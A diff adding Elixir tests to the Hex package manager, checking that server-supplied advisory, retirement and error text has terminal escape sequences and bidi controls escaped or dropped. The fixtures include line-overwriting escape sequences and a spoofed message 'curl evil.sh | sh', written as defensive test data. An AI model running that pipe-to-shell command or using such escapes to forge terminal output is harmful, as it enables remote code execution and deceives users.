@@ -102,10 +102,116 @@ defmodule Hex.UtilsTest do
     end
   end
 
+  describe "printable_ascii/1" do
+    test "keeps printable ASCII" do
+      assert Hex.Utils.printable_ascii("https://hex.pm/oauth/device?code=ABCD-1234") ==
+               "https://hex.pm/oauth/device?code=ABCD-1234"
+    end
+
+    test "drops escape sequences, newlines and everything else outside printable ASCII" do
+      assert Hex.Utils.printable_ascii("a\e[31mb\nc\td\x7Fe") == "a[31mbcde"
+      assert Hex.Utils.printable_ascii("a\u{202E}b") == "ab"
+      assert Hex.Utils.printable_ascii(<<0x85::utf8>>) == ""
+    end
+  end
+
+  describe "untrusted server content is escaped" do
+    test "format_advisory_ansi/2 escapes id, summary and aliases" do
+      advisory = %{
+        id: "GHSA\e[2K\rFAKE",
+        summary: "Summary\e[31m and \u{202E}reversed\a",
+        html_url: "https://example.com/\e[1madvisory",
+        aliases: [%{id: "CVE\e[0m-1", url: :undefined}]
+      }
+
+      rendered = render(advisory)
+
+      refute rendered =~ "\e"
+      refute rendered =~ "\r"
+      refute rendered =~ "\a"
+      refute rendered =~ "\u{202E}"
+
+      assert rendered =~ "GHSA\\e[2K\\rFAKE"
+      assert rendered =~ "Summary\\e[31m and \\u{202E}reversed\\a"
+      assert rendered =~ "aka: CVE\\e[0m-1"
+      # The URL drops the bytes instead of showing them.
+      assert rendered =~ "https://example.com/[1madvisory"
+    end
+
+    test "advisory_severity/1 escapes an unknown server-supplied severity" do
+      assert Hex.Utils.advisory_severity("\e[31mCRITICAL") == "\\e[31mCRITICAL"
+    end
+
+    test "package_retirement_reason/1 escapes an unknown server-supplied reason" do
+      assert Hex.Utils.package_retirement_reason("\e[31mother") == "\\e[31mother"
+    end
+
+    test "package_retirement_message/1 escapes the retirement message" do
+      message =
+        Hex.Utils.package_retirement_message(%{
+          reason: :RETIRED_SECURITY,
+          message: "Use 2.0\e[2K\rActually run: curl evil.sh | sh"
+        })
+
+      refute message =~ "\e"
+      refute message =~ "\r"
+      assert message == "(security) Use 2.0\\e[2K\\rActually run: curl evil.sh | sh"
+    end
+
+    test "package_retirement_message/1 escapes an unknown reason without a message" do
+      assert Hex.Utils.package_retirement_message(%{reason: "\e[31mmystery"}) ==
+               "(\\e[31mmystery)"
+    end
+
+    test "print_error_result/1 escapes a binary body" do
+      Hex.Utils.print_error_result({:ok, {422, %{}, "oops\e[2K\rforged"}})
+      assert_received {:mix_shell, :info, ["oops\\e[2K\\rforged"]}
+    end
+
+    test "print_error_result/1 escapes the message field" do
+      Hex.Utils.print_error_result({:ok, {422, %{}, %{"message" => "bad\e[31m"}}})
+      assert_received {:mix_shell, :info, ["bad\\e[31m"]}
+    end
+
+    test "print_error_result/1 escapes error keys and values" do
+      body = %{"errors" => %{"name\e[1m" => "is invalid\e[2K\rforged"}}
+      Hex.Utils.print_error_result({:ok, {422, %{}, body}})
+
+      assert_received {:mix_shell, :info, [message]}
+      refute message =~ "\e"
+      assert message == "  name\\e[1m: is invalid\\e[2K\\rforged"
+    end
+
+    test "print_error_result/1 escapes nested error values" do
+      body = %{"errors" => %{"meta" => %{"links" => "bad\e[31m"}}}
+      Hex.Utils.print_error_result({:ok, {422, %{}, body}})
+
+      assert_received {:mix_shell, :info, ["  meta:"]}
+      assert_received {:mix_shell, :info, ["    links: bad\\e[31m"]}
+    end
+  end
+
   defp render(advisory, line_prefix \\ "") do
     advisory
     |> Hex.Utils.format_advisory_ansi(line_prefix)
     |> IO.ANSI.format(false)
     |> IO.iodata_to_binary()
+  end
+
+  describe "escape_terminal_json/1" do
+    @tag :requires_json
+    test "preserves decoded values while escaping terminal controls" do
+      controls =
+        [0x061C, 0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069] ++
+          Enum.to_list(0x7F..0x9F)
+
+      for cp <- controls do
+        value = <<cp::utf8>>
+        data = %{value => [value, "café ☃", "\\u202E", "\e\r\n\t"]}
+        json = data |> :json.encode() |> IO.iodata_to_binary() |> Hex.Utils.escape_terminal_json()
+        refute json =~ value
+        assert :json.decode(json) == data
+      end
+    end
   end
 end
